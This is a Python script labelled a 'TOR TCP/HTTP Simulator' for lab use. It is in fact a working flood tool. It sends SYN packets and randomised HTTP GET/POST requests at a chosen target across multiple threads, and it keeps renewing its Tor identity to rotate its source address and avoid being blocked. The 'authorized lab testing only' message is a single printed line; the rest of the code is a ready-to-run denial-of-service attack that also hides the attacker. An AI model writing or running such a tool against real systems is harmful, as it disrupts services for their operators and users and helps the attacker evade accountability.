import time
import socket
import socks
import argparse
import threading
import random
import string
from stem import Signal
from stem.control import Controller
from scapy.all import IP, TCP, send
import requests

TOR_SOCKS_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = 'kalikali'

# Set TOR as the default proxy for all connections
def set_tor_proxy():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_SOCKS_PORT)
    socket.socket = socks.socksocket

# Request new TOR identity
def renew_tor_ip():
    with Controller.from_port(port=TOR_CONTROL_PORT) as controller:
        controller.authenticate(password=TOR_PASSWORD)
        controller.signal(Signal.NEWNYM)

# Resolve domain to IP
def resolve_target(target):
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        print("[!] Could not resolve target domain.")
        exit(1)

# Generate a random URL path
def random_url_path(length=10):
    chars = string.ascii_letters + string.digits
    return '/' + ''.join(random.choice(chars) for _ in range(length))

# Send TCP SYN packets
def send_tcp_packets(target_ip, port, count=10):
    for _ in range(count):
        pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
        send(pkt, verbose=0)

# Send HTTP GET/POST requests with random URL paths and headers
def send_http_requests(base_url, count=10, use_post=False):
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    for _ in range(count):
        path = random_url_path()
        url = base_url + path
        headers = {
            'User-Agent': f'Mozilla/5.0 ({random.randint(100,999)}Fake)',
            'Accept': '*/*',
            'Referer': 'http://google.com/'
        }
        try:
            if use_post:
                requests.post(url, data={"data": "test"}, proxies=proxies, headers=headers, timeout=5)
            else:
                requests.get(url, proxies=proxies, headers=headers, timeout=5)
        except Exception:
            pass

# Threading function for attack loop
def attack_loop(protocol, target, port, duration, use_post=False):
    start_time = time.time()
    while (time.time() - start_time) < duration:
        print("[*] Renewing TOR identity...")
        renew_tor_ip()
        time.sleep(3)

        if protocol == "tcp":
            print(f"[*] Sending TCP packets to {target}:{port}")
            send_tcp_packets(target, port)
        elif protocol == "http":
            base_url = f"http://{target}:{port}"
            print(f"[*] Sending HTTP requests to {base_url} with random paths")
            send_http_requests(base_url, use_post=use_post)

# Main function
def main():
    parser = argparse.ArgumentParser(description="TOR TCP/HTTP Simulator - Lab Use Only")
    parser.add_argument('--target', required=True, help='Target domain or IP')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--protocol', choices=['tcp', 'http'], default='tcp', help='Protocol to use')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('--threads', type=int, default=1, help='Number of concurrent threads')
    parser.add_argument('--post', action='store_true', help='Use HTTP POST instead of GET')
    args = parser.parse_args()

    print("[!] This tool is for authorized lab testing only.")
    set_tor_proxy()

    target_ip = resolve_target(args.target) if args.protocol == 'tcp' else args.target

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack_loop, args=(args.protocol, target_ip, args.port, args.duration, args.post))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[*] Simulation complete.")

if __name__ == '__main__':
    main()
